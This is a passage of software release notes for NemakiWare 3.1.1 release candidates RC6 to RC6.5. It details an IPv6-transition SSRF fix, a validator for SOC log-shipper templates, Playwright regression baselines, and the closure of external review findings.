- Manual-verification doc rounds 1 / 2 / 3: `a3ac2bc94` / `5b43eb7b4` / `343fe5545`
- RC6.5 release-package commit (RELEASE_NOTES + CLAUDE + REVIEW_PACKET): subsequent
- **`v3.1.1-RC6.5` annotated tag target**: release-package commit

The previous candidate `v3.1.1-RC6.4` is **not force-updated** and
remains at peeled commit `afdf4d832` as a historical milestone.

### Tests + verification

- `HttpWebhookDispatcherTest`: **52/52 PASS** (37 existing + 15
  new transition-address regression tests, all clean).
- Maven build: `mvn clean package -f core/pom.xml -Pdevelopment
  -DskipTests` → BUILD SUCCESS, WAR produced.
- Manual-verification §2 → §11 paths: live-verified against
  running RC6 HEAD stack, every HTTP code and response shape
  matches the documented expectation.

### Follow-up status

**Resolved in this RC**:
- GHSA SSRF via IPv6 transition wraps (NAT64 / 6to4 / IPv4-compatible).
- 3 rounds of manual-verification doc drift (15 individual findings
  + 9 self-review tightening passes).

**Remaining (operator-side, by design, carried from RC6.4)**:
- Network/TLS, SIEM credentials, notification routing, threshold tuning.
- Kibana Detection NDJSON + Splunk savedsearches CLI validation.

**Remaining (test-skip triage backlog, carried from RC6.4)**:
- The 155 persistent Playwright failures + 195 explicit skips are
  tracked under memory `test-skip-triage`. Not RC6.5 scope.

---

## 3.1.1-RC6.4 — SOC template validation gate + RC5.6 vs RC6 HEAD Playwright baseline diff
_Release candidate on `release/3.1.1-RC6` (2026-05-23), branched
off `v3.1.1-RC6.3` (`77ddfe071`)._

Quality-improvement RC. Two epics carried out in response to
recurring RC6-cycle failure patterns:

- **Epic 1**: every RC in the RC6 series so far (RC6 → RC6.1 →
  RC6.2 → RC6.3) shipped a SOC-template body bug that an external
  reviewer caught — Filebeat env syntax, Vector VRL field path,
  Fluent Bit DST handling. RC6.4 introduces a CLI validator that
  runs the actual vendor tool for 4 of 6 templates inside their
  official Docker images, so RC6.5+ stops shipping these bugs.
- **Epic 2**: prove RC6 shipped zero behavioural regressions vs
  the prior RC5 cycle by running the full Playwright chromium
  suite (1032 tests) against both `v3.1.1-RC5.6` and
  `release/3.1.1-RC6` HEAD, classifying every test into one of
  five buckets (regression / improvement / pre-existing /
  environment-flaky / explicit skip).

Java + TypeScript source: byte-equal vs RC6.3. All changes are
docs, shell scripts, or SOC-template content fixes (caught by
the new validator).

### Epic 1 — SOC template validation gate

New: `scripts/validate-soc-templates.sh` (16 KB Bash).

Phase 1 (always runs, `python3` only):
- JSON parse per line for `kibana-detection-rules.ndjson`
- YAML parse for `*.yml`
- TOML parse for `*.toml` (Python 3.11+ `tomllib`)
- NUL-byte smoke (Python — bash strips NUL from argv so the
  earlier `grep -q $'\x00' file` shape would false-positive
  every file; that bug was caught at validator bring-up)
- file-type smoke (text-class vs binary)
- placeholder enumeration (`${...}` markers, informational)

Phase 2 (opt-in `VALIDATE_DOCKER=1`, requires Docker):
- `vector validate --skip-healthchecks` (timberio/vector)
- `fluent-bit -c … --dry-run` (fluent/fluent-bit)
- `filebeat test config` (docker.elastic.co/beats/filebeat,
  with chown to root in tmpfs to satisfy 8.x ownership refusal)
- `cortextool rules check --backend=loki`
  (grafana/cortex-tools, with Python `envsubst` for
  `${VAR:-default}` since LogQL doesn't natively interpolate
  bash-style defaults)

Phase 3 (opt-in `WRITE_VALIDATION_MD=1`):
- emits `docs/soc-templates/VALIDATION.md` capturing the last
  automated run state (timestamp, branch, commit, per-check status)

**5 real template bugs caught at validator bring-up** that prior
syntax-spec-confidence approach had missed:

1. **Vector header comment `${...}` interpolation** —
   `vector validate` interpolates dollar-brace tokens *even
   inside comments*. The header comment literally contained
   `${...}` as an example, triggering "Missing environment
   variable in config. name = '...'" at validate-time.
2. **Fluent Bit `Code |` heredoc** rejected by the classic INI
   parser with "extra indentation level found" at line 59. Fixed
   by externalising the Lua to
   `fluent-bit-nemakiware-time-enrichment.lua` referenced via
   the `Script` directive.
3. **VRL `??` on the infallible field path `."@timestamp"`** —
   VRL field access is infallible (returns null for missing
   paths, never errors), so the `??` triggered the strict-mode
   error "unnecessary error coalescing operation". Switched to
   conditional assignment (`if ts_str == null { ts_str = .timestamp }`).
4. **Vector `buffer.max_size = 268435456`** (exactly 256 MiB) is
   below the `>= 268435488` minimum that Vector enforces (256 MiB
   plus 32 B internal overhead). Bumped to 536870912 (512 MiB)
   so the buffer headroom is insensitive to Vector minor-version
   drift.
5. **LogQL `offset 1h` placement** — placed AFTER the wrapping
   `count_over_time(...)` triggered "syntax error: unexpected
   offset" in cortextool. LogQL syntax puts the offset INSIDE
   the range-vector selector: `[7d] offset 1h`.

### Epic 2 — full Playwright baseline diff (RC5.6 vs RC6 HEAD)

Ran the full chromium Playwright suite (1032 tests) against
both builds on the same Docker stack, swapping only the
WAR file:

| Label | Tag / commit | WAR SHA-256 |
|---|---|---|
| RC5.6 | `v3.1.1-RC5.6` = `adf8db3b4` | `749dedd883c8146516d4f618859db2b8c317f9f972939e432cf4a7989feb592e` |
| RC6 HEAD | `release/3.1.1-RC6` HEAD = `1ba21bc59` | `9df81beb10e8f3309534e8d830c734fb9485a3bc32d38c36a52cf54e5af56328` |

(RC6 HEAD `1ba21bc59` = RC6.4 Epic 1 commit. Epic 1 is doc /
script only — zero Java, TypeScript, or test code touched
since `v3.1.1-RC6.3` `77ddfe071`. So RC6 HEAD behaviour is
equivalent to RC6.3.)

Aggregate:

| Stat | RC5.6 | RC6 HEAD | Δ |
|---|---:|---:|---:|
| Passed | 673 | 679 | **+6** |
| Failed | 162 | 156 | **−6** |
| Flaky | 2 | 2 | 0 |
| Skipped | 195 | 195 | 0 |
| Total | 1032 | 1032 | — |
| Duration | 77 min | 76 min | −1 min |

Per-test classification (per the RC6.4 spec):

- **RC6 regression: 0** — 1 candidate found (`group-management-crud.spec.ts:315`),
  reclassified as flaky (Ant `Select` dropdown viewport
  positioning; no group-management code touched between the two
  builds, so the only plausible explanation is transient state
  / virtualised dropdown scroll position).
- **Improved by RC6: 6** — 5 tests for the new
  `/v1/admin/connectors/by-group` endpoint added in RC6, plus 1
  for the RC6.1 `removePrincipalIds > MAX` 400-response cap.
- **Pre-existing fail: 155** — fail in BOTH RC5.6 and RC6 HEAD,
  evenly distributed across ~85 spec files (each `file:line`
  unique, no clusters). This is the long-running Playwright
  stabilization backlog, not RC6's burden. Top file groups:
  `components/layout-navigation` (14), `search/custom-property-search`
  (14), `components/protected-route` (12), `user-scenarios` (10).
- **Persistent pass: 672** — core production behaviour stable
  across the full RC5 → RC6 cycle.
- **Skipped (`test.skip`): 192** — explicit annotations, expected
  per memory `test-skip-triage`.

**Conclusion**: RC6 ships zero regressions vs RC5.6 + 6 net
test additions in the green. The persistent 155-failure backlog
is unchanged.

REVIEW_PACKET.md §10 inlines the full classification table and
the per-improvement spec list.

### Change scope vs RC6.3 (precise)

- **Changed in RC6.4**:
  - `scripts/validate-soc-templates.sh` (new, 16 KB)
  - `docs/soc-templates/fluent-bit-nemakiware-time-enrichment.lua` (new, Lua extraction)
  - `docs/soc-templates/fluent-bit-nemakiware.conf` (Code → Script directive)
  - `docs/soc-templates/vector-nemakiware.toml` (header comment escape + VRL conditional + buffer.max_size)
  - `docs/soc-templates/loki-ruler-rules.yml` (offset placement + comment)
  - `docs/soc-templates/README.md` (§"Template validation status" rewrite,
    validation matrix flipped: 4 of 6 CLI-validated)
  - `docs/soc-templates/VALIDATION.md` (new, generated artefact)
  - `REVIEW_PACKET.md` (§10 inline diff + classification)
  - `RELEASE_NOTES.md` (this section)
  - `CLAUDE.md` (RC6.4 entry)
- **Unchanged from RC6.3** (byte-equal):
  - All Java surface
  - All TypeScript surface (UI, services, tests)
  - All properties, patches, views, Mango indexes, migrations,
    DB bootstrap
  - Kibana NDJSON / Splunk SPL templates (no offline CLI to
    validate them against — operator gates remain)

### Commit + tag relationship

- Epic 1 (validator + 5 template fixes): `1ba21bc59`
- Epic 2 (REVIEW_PACKET §10 inline): `c077dc55d`
- RC6.4 release-package commit (this section + CLAUDE + REVIEW_PACKET retitle): subsequent
- **`v3.1.1-RC6.4` annotated tag target**: release-package commit

The previous candidate `v3.1.1-RC6.3` is **not force-updated**
and remains at peeled commit `77ddfe071` as a historical
milestone.

### Tests + verification

- **SOC validator** — `VALIDATE_DOCKER=1 scripts/validate-soc-templates.sh`
  result: PASS 20 / SKIP 3 / FAIL 0 / total 23.
  The 3 SKIPs are: Python tomllib unavailable on the host
  (Phase 2.1 covers Vector anyway), Kibana NDJSON operator
  import gate, Splunk btool operator gate.
- **Playwright full chromium ×2** — RC5.6: 673 passed / 162 failed /
  2 flaky / 195 skipped in 4622 s. RC6 HEAD: 679 passed /
  156 failed / 2 flaky / 195 skipped in 4538 s. Both runs
  finished cleanly (Playwright exit 0).
- **Java tests** — 182/182 focused 14 Java test classes
  (byte-equal vs RC6.3 — RC6.4 only touches docs / shell scripts /
  SOC template content; zero Java touched).
- **TypeScript build** — `npm run build` clean (UI built RC6 HEAD
  WAR for Epic 2 deploy).
- **Vector / Fluent Bit / Filebeat / cortextool** — all 4
  validated by their actual CLI in their official Docker images
  (Epic 1 acceptance). The validator script + the validator's
  CLI exit codes are the verification artefact.

### Follow-up status

**Resolved in this RC**:
- 5 real template bugs (the ones the validator caught at bring-up).
- Recurring RC6-cycle pattern of "template body bug surfaces only
  at external review" — the validator gate now catches these
  before tag.
- Long-standing question "is RC6 introducing regressions vs
  RC5.6 in the 155-failure cluster?" — answered with full
  Playwright baseline diff: **no**.

**Remaining (operator-side, by design)**:
- Network / TLS, SIEM credentials, notification routing,
  threshold tuning.
- Kibana Detection NDJSON + Splunk savedsearches CLI
  validation — no offline parser exists for either;
  validation requires operator import into a live cluster.

**Remaining (test-skip triage backlog)**:
- The 155 persistent Playwright failures and the 195
  explicit skips are tracked under memory
  `test-skip-triage` (Playwright 421件のtest.skip分類と改善方針).
  Not RC6.4 scope.

---

## 3.1.1-RC6.3 — RC6.2 review (5 findings, all closed) + tag/branch realignment
_Release candidate on `release/3.1.1-RC6` (2026-05-23), branched
off `v3.1.1-RC6.2` (`02afee891`)._

Closure RC for the external review that ran on RC6.2 post-tag.
5 findings (P1 ×2 + P2 ×2 + P3 ×1). All resolved.

The two P1 items are essentially the same complaint that
RC5.5→RC5.6, RC6→RC6.1, and RC6.1→RC6.2 all surfaced: when
substantive content lands as post-tag commits, the tag stops
matching the shipping artifact and the "code artifact = tag"
framing in REVIEW_PACKET §1 misleads reviewers. The repeat
fix is the same: cut a new tag. RC6.2 (`02afee891`) is
**not force-updated** and remains a historical milestone.

### P1-A — Tag/branch mismatch (resolved via RC6.3 tag)

After RC6.2 closure, 5 review fixes (commit `bf7c07b3f`)
landed as post-tag doc/config. A reviewer checking out
`v3.1.1-RC6.2` for code review would see the previous
Filebeat / Fluent Bit / Vector bugs unfixed. RC6.3 tag is cut
against the current branch HEAD so reviewers see the corrected
shape.

### P1-B — Divergence rule mislabel (resolved via RC6.3 tag)

REVIEW_PACKET §3 listed `docs/soc-templates/**` as allowed
divergence with the qualifier "review-time clarifying additions
only". The `bf7c07b3f` post-tag commit was config-body fixes
(executable shipper config), not clarifications. Cutting RC6.3
collapses the divergence to zero and removes the need for the
"clarifying additions only" qualifier.

### P2-A — Fluent Bit DST sensitivity

The previous Lua filter (`fluent-bit-nemakiware.conf` line 75
in RC6.2-post-tag) used a single utc_offset computed from
`now`. For TZs with DST (America/New_York, Europe/London, …)
processing audit lines near or across DST transitions — or
re-ingesting historical logs — produced a 1-hour error.

Fix: per-record offset computation:
```lua
local function utc_offset_at(epoch)
  return os.difftime(epoch, os.time(os.date("!*t", epoch)))
end
local naive = os.time({...UTC components treated as local...})
local target = naive + utc_offset_at(naive)
-- DST spring-forward boundary may need one more step
if utc_offset_at(target) ~= utc_offset_at(naive) then
  target = naive + utc_offset_at(target)
end
```

For non-DST TZs (UTC / JST / KST / AEST / …) the offset is
constant and the algorithm collapses to the previous shape.

### P2-B — Vector parse_timestamp fallibility

`parse_timestamp(...)` is a fallible VRL function. Without
explicit error handling, VRL strict-mode compilation rejects
the transform. Added `?? null` coalesce:

```vrl
ts_parsed = parse_timestamp(ts_str, "%+") ?? null
if ts_parsed != null { ... }
```

Malformed timestamps now fall through to the null-guard
rather than failing the entire transform.

### P3 — REVIEW_PACKET §5 strong-claim leftover

§5 still asserted "none of the 155 failures are attributable to
RC6 / RC6.1 / RC6.2 code changes", stronger than the §2 note 4
evidence boundary set in RC6.2-post-tag. Reworded to "none
show up in the 6 directly-touched specs; what this does NOT
prove: that the 155 elsewhere are all pre-existing." Now
consistent with the rest of the doc.

### Change scope vs RC6.2 (precise)

- **Changed in RC6.3**:
  - `docs/soc-templates/filebeat-nemakiware.yml` (post-tag
    bf7c07b3f: `${VAR:default}` syntax, now in tag artifact)
  - `docs/soc-templates/fluent-bit-nemakiware.conf` (P2-A
    per-record DST-aware offset)
  - `docs/soc-templates/vector-nemakiware.toml` (post-tag
    bf7c07b3f: VRL field path fix + 256 MiB; RC6.3 P2-B
    `?? null` coalesce)
  - `REVIEW_PACKET.md` (P3 §5 tone + §3 divergence-rule
    requalifier, this rewrite)
  - `CLAUDE.md`, `RELEASE_NOTES.md`, `docs/design/connector-delegation.md`
    (RC6.3 section)
- **Unchanged from RC6.2** (byte-equal):
  - All Java surface (Controller, services, tests)
  - All TS surface (ConnectorGovernanceTab, services, specs)
  - Kibana NDJSON / Loki YAML / Splunk SPL / Filebeat /
    Fluent Bit / Vector except the explicit fixes above
  - i18n, properties, patches, views, Mango, migrations, DB
    bootstrap

### Commit + tag relationship

- P2/P3 fixes (Fluent Bit DST + Vector ?? + tone): `3afd284f5`
- RC6.3 docs closure: subsequent
- **`v3.1.1-RC6.3` annotated tag target**: doc-closure commit

The previous candidate `v3.1.1-RC6.2` is **not force-updated**
and remains at peeled commit `02afee891` as a historical
milestone.

### Tests + verification

- 182/182 focused 14 Java test classes (unchanged from RC6.2 —
  RC6.3 only touches docs/soc-templates and REVIEW_PACKET)
- 66/66 RC5/RC6-area Playwright smoke (no flake)
- Full chromium suite NOT re-run — RC6.3 changes are
  config/doc-only, no UI behavior change.
- NDJSON / YAML / SPL syntax revalidated
- Fluent Bit Lua: math-traced plausibility check for UTC / JST / DST
  spring-forward boundary cases
- Vector VRL: still NOT live-validated (`vector` binary absent
  on the build host); the `?? null` fix is a syntax-spec
  confidence fix, not runtime-proven

### Follow-up status

**Resolved in this RC**: 5 RC6.2 review findings.

**Remaining (operator-side, by design)**: network / TLS, SIEM
credentials, notification routing, threshold tuning.

**Remaining (separate epic)**: Full Playwright RC5.6
baseline-diff for the 155 cluster.

**Remaining (verification gap)**: Vector VRL config not
live-validated against a vector CLI; high-confidence syntax
fix only.

---

## 3.1.1-RC6.2 — RC6.1 external + self-review (17 findings, all closed) + first full Playwright sweep
_Release candidate on `release/3.1.1-RC6` (2026-05-22), branched
off `v3.1.1-RC6.1` (`595754b8c`)._

Closure RC for the second-round R1 review (4 findings) plus a
parallel self-critical review of the same surface (13 findings).
All 17 items are resolved on the repo side. The RC6.1 tag
(`595754b8c`) is **not force-updated** and remains a historical
milestone.

This is also the first RC in the cycle to run the **full
chromium Playwright suite** (118 specs / 1030 tests), not just
the RC5/RC6-area smoke. The honest result: **684 passed, 155
failed, 94 skipped, 97 did-not-run** in 1.3 hours. The 155
failures cluster in non-RC6.x-touched UI areas (documents /
permissions / search / versioning), most plausibly React 19 /
AntD 5 drift that has accumulated through the cycle. We have
NOT compared against an RC5.6 baseline in this RC, so the
"pre-existing" framing is a working assumption rather than a
proven claim. What IS proven: the RC5/RC6-area 6-spec smoke
remains 66/66 PASS after all RC6.2 changes. Full-suite
green-up + RC5.6 baseline-diff is its own epic for follow-up.

### Tier 1: review-required fixes (6)

#### #3 — Splunk `startswith=eval(...)` invalid SPL
The RC6.1 fix introduced `startswith=eval(operation==...)`,
which the SPL parser rejects (`eval` is a command, not a
transaction arg wrapper). Replaced with the documented
parens-only form `startswith=(operation="...")`.

#### #2 — Kibana NDJSON Detection Engine schema review
EQL `sequence by userId.keyword,repositoryId.keyword` syntax
explicitly documents the dependency on the default Filebeat /
Vector dynamic mapping (where short strings get a `.keyword`
subfield). `new_terms` rule confirmed to accept both `query`
and `new_terms_fields` per Detection Engine schema. **Note**:
the rules are not validated against a live Elastic 8 cluster
in this repo — operators must verify import on their target
stack version.

#### #14 — Kibana off-hours rule depended on fields shippers didn't create
The off-hours rule (`hour_of_day_local < 6 OR ...`) referenced
two fields the previous shipper templates never added. Now
delivered:
- `vector-nemakiware.toml`: VRL `format_timestamp!` with
  `timezone:` honouring `${BUSINESS_HOURS_TZ:-UTC}`
- `fluent-bit-nemakiware.conf`: Lua filter using `os.date`
  (honours Fluent Bit process `TZ` env)
- `filebeat-nemakiware.yml`: JS script processor using the JS
  `Date` object (honours Filebeat process `TZ` env)

README's new "Off-hours rule timezone / enrichment" section
documents the TZ env requirement per shipper.

#### #15 — Kibana threshold values not actually placeholder-driven
RC6.1 used `${BURST_THRESHOLD}` / `${LOST_COUNT_OUTLIER_THRESHOLD}`
in description text but hardcoded `20` / `50` in rule logic
(JSON syntax forbids `${VAR}` in numeric value positions).
Replaced description placeholders with the actual defaults
and shipped a README sed cookbook for overrides:

```bash
sed -i.bak -e 's/"value":20/"value":35/' \
           -e 's/details\.lostCount > 50/details.lostCount > 80/' \
           kibana-detection-rules.ndjson
```

#### #16, #17 — stale filename refs + grep pattern
Removed three stale `kibana-alerting-rules.json` references
(filebeat ×2 + fluent-bit ×1). Extended README's placeholder
grep pattern to include `*.ndjson` with `2>/dev/null` to
swallow missing-glob warnings.

### Tier 2: should-fix (4)

#### #11 — perMemberImpact member ordering non-deterministic
`memberUserIds = group.getUsers().subList(0, memberCap)` used
the CouchDB view's emit order. Two consecutive
`/by-group/{id}?memberLimit=N` calls against a > N-member
group could return different N-member sets. Added
`Collections.sort(allMemberUserIds)` immediately after model
load (and the same for `subGroupIds`). Truncation now samples
the lexicographically smallest N — reproducible across calls
and replicas. 2 new unit tests pin the sort:
`byGroup_memberUserIdsSortedAlphabetically_RC62_review11` and
`byGroup_memberLimitTruncation_takesFirstNAlphabetically_RC62_review11`.

#### #7 — P2-1 cap hides connector identities past 50
The `MAX_LOST_PER_MEMBER = 50` cap leaves operators blind to
the 51st+ lost connector's identity. Resolved without API
expansion via `docs/SOC-AUDIT-INTEGRATION.md §5.6` (new):
fall back to `/by-principal/{userId}?expand=true` for any
member with `lostIfGroupRemovedTruncated=true` to get the full
per-user connector set, then intersect locally.

#### #8 — Filebeat `${HOSTNAME}` env interpolation gotcha
Clarified that `${HOSTNAME}` is Filebeat's own env-var syntax
(NOT shell expansion at config-load time). README documents
that operators using systemd / docker-compose must ensure the
Filebeat process has `HOSTNAME` in its env.

#### #9 — Loki TZ + label binding undocumented
Added explicit TZ rewrite example (`^(1[3-9]|20)$` for JST
22:00-05:59 = UTC 13:00-20:59) to README. Documented that
Loki Ruler validation should use `cortextool rules check`
before deploy.

### Tier 3: cleanup (4)

#### #6 — `externalIngest.ts` vestigial in REVIEW_PACKET §3
Removed from the allowed-divergence list — it was a copy-paste
from RC5.6 that never got modified post-tag in this cycle.

#### #10 — test count drift
Real focused-14 test count is **182** (RC6 177 + RC6.1 +3 +
RC6.2 +2 = 182). Past claims of "180 → +7 = 184" were
arithmetic error from counting renamed tests as additions.
All future RC numbers re-counted via `mvn test`.

#### #12 — L1 useMemo comment overclaimed perf benefit
The comment said the `[simulateRemove]` dep array was the win.
In fact `simulateRemove` reference changes on every antd
Select onChange, so `JSON.stringify` runs every render that
matters — no perf gain. Rewrote the comment to be accurate:
the memo exists for explanatory stability of the downstream
`[simulateRemoveKey]` dep array, not for skipping recomputation.

#### #13 — "解消" framing inconsistency
CLAUDE.md / REVIEW_PACKET / RELEASE_NOTES previously called R1
"解消" in one place and "mostly resolved" in another. Aligned
to: **repo-shippable scope complete; 4 deployment-specific
items (network, secrets, notification routing, threshold
baseline) inherently remain operator-side and cannot ship as
templates**.

### Tier 1 follow-up: #1 — "66/66 regression" honest re-label

Previous RCs cited "66/66 RC5+RC6 Playwright regression". The
universe was actually 6 of 118 specs — a smoke, not a
regression. RC6.2 ran the full chromium suite for the first
time:

- **684 passed** (66 of those are the RC5/RC6-area smoke,
  unchanged)
- **155 failed** (clustered in non-RC6.x-touched UI areas;
  "pre-existing" treated as a working assumption — NOT validated
  against an RC5.6 baseline in this RC)
- **94 skipped** (externalauth specs gate on Keycloak
  availability)
- **97 did-not-run** (serial-mode chain aborts in failing
  describe blocks)

Going forward, full-suite green-up is a separate epic. RC6.2
docs are honest: the 66/66 number is "smoke", the 684/155 is
"full chromium current state".

### Change scope vs RC6.1 (precise)

- **Changed in RC6.2**:
  - `core/src/main/java/jp/aegif/nemaki/rest/ingest/ConnectorDefinitionController.java`
    (P2-1 cap + new fields, P2-2 revert + comment, M2 size limits,
    M3 caching, L2 null fold, **#11 sort**)
  - `core/src/test/java/jp/aegif/nemaki/rest/ingest/ConnectorByPrincipalGovernanceTest.java`
    (+2 #11 sort tests)
  - `core/src/main/webapp/ui/src/components/IntegrationSettings/ConnectorGovernanceTab.tsx`
    (L1 + P2-3 + P3 + **#12 useMemo comment**)
  - `docs/soc-templates/*` (#3 Splunk, #2 Kibana NDJSON, #14
    shipper enrichment, #15 sed cookbook, #16 stale refs,
    #17 grep, #8 HOSTNAME, #9 Loki TZ)
  - `docs/SOC-AUDIT-INTEGRATION.md` (+#7 §5.6 per-user fallback)
  - `docs/design/connector-delegation.md` (RC6.2 history section)
  - `CLAUDE.md`, `REVIEW_PACKET.md`, `RELEASE_NOTES.md` (this
    section, #6 vestigial entry removed, #13 framing alignment)
- **Unchanged from RC6.1** (byte-equal):
  - All RC5 + RC6 + RC6.1 product code paths not specifically
    listed above
  - Patch / view / Mango / migration / DB bootstrap
  - i18n files (no new keys in RC6.2)

### Commit + tag relationship

- SOC fixes (Splunk + Kibana NDJSON + shipper enrichment): `750d70d85`
- sort + useMemo comment: `fd03d4ab4`
- Doc closure (this section): subsequent
- **`v3.1.1-RC6.2` annotated tag target**: doc-closure commit

The previous candidate `v3.1.1-RC6.1` is **not force-updated**
and remains at peeled commit `595754b8c` as a historical
milestone.

### Tests + verification

- 182/182 focused 14 Java test classes pass (RC6 177, RC6.1
  +3, RC6.2 +2)
- 66/66 RC5/RC6-area Playwright smoke (no flake, 2 consecutive
  runs)
- 684/155/94/97 full chromium suite (155 failures all in
  non-RC6.x-touched UI areas; "pre-existing" remains a working
  assumption — not validated against an RC5.6 baseline)
- NDJSON syntax + Loki YAML + Splunk SPL all validate
- All 3 shipper templates contain `hour_of_day_local`
  enrichment
- Live deploy unaffected (no Java surface change beyond #11
  sort, which is response-shape-additive)

### Follow-up status (cumulative across RC5+RC6+RC6.1+RC6.2 cycle)

**Resolved in this RC**: 17 review findings (Tier 1 ×6 +
Tier 2 ×4 + Tier 3 ×4 + Tier 1 follow-up #1).

**Remaining (repo)**: none. R1 SOC integration's
repo-shippable scope is complete via the playbook
(`docs/SOC-AUDIT-INTEGRATION.md`) and templates
(`docs/soc-templates/`).

**Remaining (operator-side, by design)**: network path / TLS
to the SIEM, SIEM credentials from secrets manager,
notification routing (PagerDuty / Slack), threshold tuning
from 7-day environment baseline. These are not repo-shippable
artifacts.

**Remaining (separate epic)**: full Playwright suite has 155
failures distributed across older UI specs. Most plausibly
pre-existing React 19 / AntD 5 drift; that framing is a working
assumption — we did NOT validate by re-running the same full
suite against `v3.1.1-RC5.6`. The 6 RC5/RC6-area specs RC6.x
directly touched remain 66/66 PASS. Green-up + RC5.6
baseline-diff is its own engineering project.

---

## 3.1.1-RC6.1 — RC6 external review fixes (P2-1 / P2-2 / P2-3 / P3)
_Release candidate on `release/3.1.1-RC6` (2026-05-22), branched
off `v3.1.1-RC6` (`9dfd87adb`)._

Correction cycle from the first external review of RC6. The
reviewer surfaced 3 P2 findings + 1 P3 finding, all repo-local
and resolvable without API contract change. RC6.1 closes all four.
RC6 tag (`9dfd87adb`) is **not force-updated** and remains a
historical milestone.

### P2-1: /by-group response amplification cap

Each `perMemberImpact` entry carried the full
`ConnectorPrincipalMatch` object for every group-only connector
that member was about to lose. With `memberLimit=1000` and many
such connectors, the JSON ballooned `O(members × connectors)`
even after the M3 connector-list cache reduced the CouchDB
roundtrips to 1.

- New `MAX_LOST_PER_MEMBER = 50` constant caps each member's
  `lostIfGroupRemoved` array.
- New `lostCount` field (untruncated count) and new
  `lostIfGroupRemovedTruncated` boolean signal truncation —
  SOC and the UI can detect "this member loses a lot" without
  forcing the server to ship the full payload.
- JavaDoc on `listByGroup` updated; the new constant is
  documented alongside `MAX_MEMBER_LIMIT`,
  `MAX_REMOVE_PRINCIPAL_IDS`, `MAX_PRINCIPAL_ID_LENGTH` for
  consistency.

### P2-2: buildMatches matchedPrincipalIds order regression

The RC6 M3 inner-loop direction switch ("iterate the smaller of
`allowed` vs `principalsToMatch`") emitted matched entries in
`principalsToMatch` order when the user was expanded into many
groups. That broke the byte-identical response invariant claimed
in REVIEW_PACKET §2 and would surface as flaky test assertions
for any client comparing `matchedPrincipalIds` arrays directly.

Reverted to always iterating `allowed` so the output order tracks
the connector's declared principal order. `principalsToMatch` is
always a Set at the callsites (LinkedHashSet or HashSet), so
contains() is already O(1) — the direction switch was misguided
and the HashSet wrap unnecessary.

### P2-3: NUL byte in ConnectorGovernanceTab.tsx

The RC6 L1 fix intended to land `simulateRemove.join(' ')` as the
content-stable dep-array key, but the actual file content ended
up with a literal NUL byte between the two single quotes
(`join('\0')`). The `file` utility classified the source as
binary; grep / IDE search treated it as non-text. TypeScript
compiled fine but common dev tooling broke.

Replaced with `JSON.stringify(simulateRemove)` per the reviewer's
suggestion — content-stable, no ambiguous separator semantics,
no control-byte hazard, order-sensitive. A permanent comment
block explains why single-char separators are off-limits so a
future edit doesn't regress to a delimiter.

### P3: initialFetchDoneRef per-kind tracking

`initialFetchDoneRef` was a single boolean shared across picker
modes. Opening group mode first flipped the flag → switching to
principal mode → `ensureInitialFetch` saw the flag → never
fetched the USER kind → principal-mode dropdown showed only
groups until the operator typed something.

Replaced with a `Set<'USER' | 'GROUP'>` ref. Each kind is
fetched at most once per mount; a missing kind is fetched on the
next dropdown open regardless of what's already cached.
`fetchPrincipals` now merges new options with the existing set
instead of replacing wholesale — switching modes preserves the
previously-fetched kind's options + totals. `pickerTotals` also
merges so the dropdown footer (`{loaded} of {total}`) stays
accurate across mode switches without an unnecessary refetch
of the kind we already have.

### Change scope vs RC6 (precise)

- **Changed in RC6.1**:
  - `core/src/main/java/jp/aegif/nemaki/rest/ingest/ConnectorDefinitionController.java`
    (P2-1 cap + new fields, P2-2 revert + comment)
  - `core/src/test/java/jp/aegif/nemaki/rest/ingest/ConnectorByPrincipalGovernanceTest.java`
    (+3 cases — P2-1 ×2, P2-2 ×1)
  - `core/src/main/webapp/ui/src/components/IntegrationSettings/ConnectorGovernanceTab.tsx`
    (P2-3 JSON.stringify, P3 per-kind Set ref + fetchPrincipals
    merge)
  - `CLAUDE.md`, `REVIEW_PACKET.md`, `RELEASE_NOTES.md` (this
    section), `docs/design/connector-delegation.md` §12.18
- **Unchanged from RC6** (byte-equal):
  - All other product code (B3-2 server contract, V8/G2 scale
    logic, M2 / M3, L2, Dependabot bumps)
  - Patch / view / Mango / migration / DB bootstrap
  - i18n files

### Commit + tag relationship

- P2-1 + P2-2 (server) commit: `be7160d48`
- P2-3 + P3 (UI) commit: `a246ffe81`
- **`v3.1.1-RC6.1` annotated tag target**: the doc commit
  immediately following this section

The previous candidate `v3.1.1-RC6` is **not force-updated** and
remains at peeled commit `9dfd87adb` as a historical milestone.

### Tests + verification

- 30/30 `ConnectorByPrincipalGovernanceTest` pass (was 27)
- 180/180 across the 14 focused Java test classes (was 177)
- 66/66 RC5+RC6 Playwright regression (no flake)
- TypeScript clean + UI build green
- `file ConnectorGovernanceTab.tsx` → "Unicode text, UTF-8 text"
  (was "data")
- Live deploy + atom 200

### Follow-up status (cumulative across RC5+RC6 cycle)

**Resolved in this RC**: P2-1, P2-2, P2-3, P3.

**Remaining**: none in repo scope. `R1` (the last open item
from RC5.5 closure) is fully resolved on the repo-shippable
side via the operator playbook
(`docs/SOC-AUDIT-INTEGRATION.md`) and import-ready
templates (`docs/soc-templates/` — Filebeat / Fluent Bit /
Vector log shippers + Kibana Detection Engine NDJSON / Loki
Ruler / Splunk savedsearches rule sets) added post-RC6.1.

The four items that remain are deployment-specific and
inherently cannot ship as generic templates: (a) network path
/ firewall / TLS to the SIEM, (b) SIEM credentials from your
secrets manager, (c) notification routing (PagerDuty
integration key, Slack webhook URL), (d)
`${BURST_THRESHOLD}` / `${LOST_COUNT_OUTLIER_THRESHOLD}`
tuning from your environment's 7-day baseline. These belong in
the operator's deployment runbook, not in this repository.

---

## 3.1.1-RC6 — B3-2 group-membership impact + V8/G2 picker scale + governance medium/low cleanup + Dependabot security pass
_Release candidate on `release/3.1.1-RC6` (2026-05-21 → 2026-05-22),
branched off `v3.1.1-RC5.6` (`adf8db3b4`)._

First independent feature RC after the RC5.x correction series.
Closes every open item from the RC5.5 closure follow-up table
(B3-2, V8/G2, H2, M2, M3, L1, L2) plus the 35-alert Dependabot
backlog. No public API contract regression, no DB / patch / view /
migration change. RC5.6 tag (`adf8db3b4`) remains as a historical
milestone.

### B3-2: group-membership impact governance view

New admin-only endpoint:

```
GET /v1/admin/connectors/by-group/{groupId}
    ?repositoryId=...
    &includeMembers=true|false  (default true)
    &memberLimit=200            (default 200, server clamp 1000)
```

Complements the existing `/by-principal/{id}` view. For a given
group ID returns:

- `memberUserIds[]` (capped at `memberLimit`) +
  `memberUserIdsTruncated` + `memberCount` (untruncated total)
- `directGrants[]` — connectors that list the group ID directly
